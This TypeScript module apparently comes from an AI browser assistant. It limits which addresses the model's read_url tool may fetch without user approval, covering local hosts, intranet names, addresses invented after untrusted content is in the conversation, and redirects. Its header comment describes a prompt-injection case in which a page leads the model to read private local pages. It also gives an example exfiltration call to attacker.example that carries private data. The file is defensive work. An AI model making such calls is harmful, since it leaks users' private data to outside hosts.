/**
 * AIC-2 (Enki 0.8.14): what read_url may reach without asking.
 *
 * read_url works in Ask and Act and used to be a free read of any http(s) address. Two problems:
 *   1. Local reach: loopback, private and link-local addresses, and intranet names, can hold
 *      private pages (router, NAS, Ollama/OmniRoute ports, work tools). A page could get the model
 *      to read one and repeat it.
 *   2. Exfiltration: once web content is in the conversation, a page can ask the model to call
 *      read_url("https://attacker.example/?d=<private data>"). The request itself is the leak.
 *
 * The rules (Cloak owns them; keep them in this one place):
 *   - A local address needs the user: either they named that host in their message, or they click
 *     Allow on the card. It never auto-approves.
 *   - After untrusted content is in the conversation (this turn's page data, or any earlier tool
 *     result), an address that is neither one the user named nor one that appeared verbatim in
 *     that content asks first. Search-result links and links the page text spelled out still read
 *     freely; an address the model built (new query string, new path) does not.
 *   - Redirects are re-checked: the final address may not land on a local host other than the
 *     one the user approved (executor.ts).
 *
 * Pure and dependency-free (no chrome APIs) so test/safety-unit.cjs covers it. It reuses the
 * BYOM endpoint policy's IP parsing; it does not change BYOM's own rules.
 */
import { classifyHost, parseIPv4, parseIPv6 } from "../providers/endpoint-policy";
import { namedByUser } from "../agent/actions";
import type { Message } from "../types";

/** Where a read_url address points. "public" = an ordinary internet host. */
export type ReadUrlReach = "device" | "network" | "public";

/** Name suffixes that only resolve inside a home or company network. */
const LOCAL_SUFFIXES = [".local", ".lan", ".home", ".home.arpa", ".internal", ".intranet", ".corp", ".localdomain", ".private"];

function reachOfIPv4([a, b]: number[]): ReadUrlReach {
  if (a === 127 || a === 0) return "device";
  if (a === 10) return "network";
  if (a === 172 && b >= 16 && b <= 31) return "network";
  if (a === 192 && b === 168) return "network";
  if (a === 169 && b === 254) return "network"; // link-local, incl. cloud metadata 169.254.169.254
  if (a === 100 && b >= 64 && b <= 127) return "network"; // CGNAT / Tailscale 100.64/10
  return "public";
}

/** The URL hostname (as `new URL()` gives it) → device / network / public. */
export function readUrlReach(hostname: string): ReadUrlReach {
  const host = hostname.toLowerCase().replace(/\.$/, "");
  if (!host) return "device";
  if (host === "localhost" || host.endsWith(".localhost")) return "device";
  const v4 = parseIPv4(host);
  if (v4) return reachOfIPv4(v4);
  if (host.startsWith("[") && host.endsWith("]")) {
    const g = parseIPv6(host.slice(1, -1));
    if (!g) return "network"; // unparsable literal: fail closed
    if (g.every((x) => x === 0)) return "device"; // [::]
    if (g.slice(0, 5).every((x) => x === 0) && g[5] === 0xffff) {
      return reachOfIPv4([g[6] >> 8, g[6] & 255, g[7] >> 8, g[7] & 255]);
    }
    if ((g[0] & 0xffc0) === 0xfe80) return "network"; // fe80::/10 link-local
    const cls = classifyHost(host);
    if (cls === "loopback") return "device";
    if (cls === "private") return "network";
    return "public";
  }
  const cls = classifyHost(host);
  if (cls === "loopback") return "device";
  if (cls === "private") return "network";
  // A single-label name ("router", "nas", "intranet") only resolves on the local network.
  if (!host.includes(".")) return "network";
  if (LOCAL_SUFFIXES.some((s) => host.endsWith(s))) return "network";
  return "public";
}

export function isLocalReach(r: ReadUrlReach): boolean {
  return r !== "public";
}

/** The user typed this host (IP, localhost, or name) in their own message. */
export function userNamedHost(url: string, userRequest: string): boolean {
  let u: URL;
  try { u = new URL(url); } catch { return false; }
  const text = userRequest.toLowerCase();
  if (!text) return false;
  const host = u.hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (!host) return false;
  const esc = host.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  if (new RegExp(`(^|[^a-z0-9.\\-])${esc}([^a-z0-9\\-]|\\.(?![a-z0-9])|$)`).test(text)) return true;
  // Public sites: the shared rule ("github" names github.com, never github.evil.io).
  return readUrlReach(u.hostname) === "public" && namedByUser(url, userRequest);
}

/** Characters that may continue a URL: a match followed by one of these is only a prefix. */
const URL_CONTINUES = /[A-Za-z0-9\-._~/?#@$&+=%:!*,;'[\]]/;

/**
 * This exact address appeared in content the model has already seen (a search-result link, a
 * link spelled out in page text). A longer address that only starts with a seen one does not
 * count: that is where a page would have the model append data.
 */
export function seenVerbatim(url: string, seen: readonly string[]): boolean {
  const forms = new Set<string>();
  forms.add(url);
  try {
    const href = new URL(url).href;
    forms.add(href);
    if (href.endsWith("/")) forms.add(href.slice(0, -1));
  } catch { /* the given form only */ }
  for (const blob of seen) {
    const text = String(blob ?? "");
    for (const f of forms) {
      if (f.length < 8) continue;
      let i = text.indexOf(f);
      while (i >= 0) {
        const next = text[i + f.length];
        if (next === undefined || !URL_CONTINUES.test(next)) return true;
        i = text.indexOf(f, i + 1);
      }
    }
  }
  return false;
}

export type ReadUrlFacts = {
  reach: ReadUrlReach;
  /** The user named this host in their message: no card for that reason. */
  userNamed: boolean;
  /** Untrusted content is in the conversation (this turn or earlier). */
  untrustedInContext: boolean;
  /** The exact address appeared in that content. */
  seen: boolean;
};

export type ReadUrlGate = "none" | "local" | "untrusted";

/** Which card read_url needs, if any. Local wins: it names the bigger risk. */
export function readUrlGate(f: ReadUrlFacts): ReadUrlGate {
  if (isLocalReach(f.reach) && !f.userNamed) return "local";
  if (f.untrustedInContext && !f.userNamed && !f.seen) return "untrusted";
  return "none";
}

/**
 * After a redirect: may the final address be read? Local hosts only when they are the very host
 * that was approved (named or allowed on the card). A public final address is fine.
 */
export function redirectAllowed(requestedUrl: string, finalUrl: string): boolean {
  let req: URL, fin: URL;
  try { req = new URL(requestedUrl); fin = new URL(finalUrl); } catch { return false; }
  if (fin.protocol !== "http:" && fin.protocol !== "https:") return false;
  if (!isLocalReach(readUrlReach(fin.hostname))) return true;
  return fin.hostname.toLowerCase() === req.hostname.toLowerCase();
}

/** Earlier turns' tool results to keep for read_url's checks: newest first, bounded. */
const PRIOR_MAX_RESULTS = 24;
const PRIOR_MAX_CHARS = 60_000;

/**
 * The text of every tool result in earlier turns of the conversation (the model still has them in
 * context). Any tool result counts as untrusted: they all carry page, search, tab or app content.
 */
export function priorUntrustedFrom(history: ReadonlyArray<Message>): string[] {
  const out: string[] = [];
  for (let i = history.length - 1; i >= 0 && out.length < PRIOR_MAX_RESULTS; i--) {
    const m = history[i];
    if (m.role !== "tool") continue;
    for (let j = m.parts.length - 1; j >= 0 && out.length < PRIOR_MAX_RESULTS; j--) {
      const textOf = m.parts[j].content
        .map((c) => (c.type === "text" ? c.text : ""))
        .join("\n");
      // An image-only result (screenshot) still means page content was seen.
      out.push(textOf ? textOf.slice(0, PRIOR_MAX_CHARS) : `[${m.parts[j].name} result]`);
    }
  }
  return out;
}
